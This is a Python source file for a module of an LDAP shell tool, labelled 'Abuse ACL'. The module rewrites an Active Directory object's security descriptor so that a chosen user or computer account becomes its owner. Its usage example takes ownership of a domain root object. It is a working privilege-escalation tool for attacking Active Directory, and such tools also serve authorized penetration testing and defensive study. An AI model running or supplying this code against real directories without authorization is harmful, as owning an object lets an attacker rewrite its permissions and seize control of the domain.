import logging
from ldap3 import Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
import ldap3
from ldap_shell.utils.ldap_utils import LdapUtils
from ldap_shell.utils.ace_utils import AceUtils
from ldap_shell.utils.ldaptypes import SR_SECURITY_DESCRIPTOR
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.protocol.microsoft import security_descriptor_control
import ldap_shell.utils.ldaptypes as ldaptypes

class LdapShellModule(BaseLdapModule):
    """Module for setting object owner"""
    
    help_text = "Set new owner for target object"
    examples_text = """
    Example: set owner of DC=domain,DC=local to user john
    `set_owner DC=domain,DC=local john`
    ```
    [INFO] Owner modified successfully! john now owns DC=domain,DC=local
    ```
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target object DN",
            arg_type=ArgumentType.DN
        )
        grantee: str = Field(
            None,
            description="New owner account",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER]
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def __call__(self):
        # Validate target DN
        if not LdapUtils.check_dn(self.client, self.domain_dumper, self.args.target):
            self.log.error('Invalid target DN: %s', self.args.target)
            return

        if not self.args.grantee:
            self.log.info('Grantee account not provided, using current user')
            self.args.grantee = self.client.user.split('\\')[1]

        # Get grantee information
        grantee_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.grantee)
        if not grantee_dn:
            self.log.error(f'Grantee account not found: {self.args.grantee}')
            return

        grantee_sid = LdapUtils.get_sid(self.client, self.domain_dumper, self.args.grantee)
        if not grantee_sid:
            self.log.error(f'Failed to get SID for: {self.args.grantee}')
            return

        # Prepare security descriptor
        try:
            self.client.search(
                self.domain_dumper.root,
                f'(distinguishedName={self.args.target})',
                attributes=['nTSecurityDescriptor'],
                controls=ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x01)
            )
            if len(self.client.entries) > 0:
                sd_data = self.client.entries[0]['nTSecurityDescriptor'].raw_values
            else:
                sd_data = None
            
            if sd_data:
                sd = SR_SECURITY_DESCRIPTOR(data=sd_data[0])
            else:
                sd = LdapUtils.create_empty_sd()

        except Exception as e:
            self.log.error(f'Error processing security descriptor: {str(e)}')
            return

        # Set new owner
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        sd['OwnerSid'].fromCanonical(format_sid(grantee_sid))
        
        # Apply changes
        try:
            res = self.client.modify(
                self.args.target,
                {'nTSecurityDescriptor': [(ldap3.MODIFY_REPLACE, [sd.getData()])]},
                controls=ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x01)
            )
        except Exception as e:
            self.log.error(f'Modification failed: {str(e)}')
            return

        if res:
            self.log.info('Owner modified successfully! %s now owns %s',
                        self.args.grantee, self.args.target)
            if self.client.authentication == 'ANONYMOUS':
                self.log.info('For changes to take effect, please restart ldap_shell')
        else:
            self.log.error('Failed to modify owner: %s', self.client.result['description'])
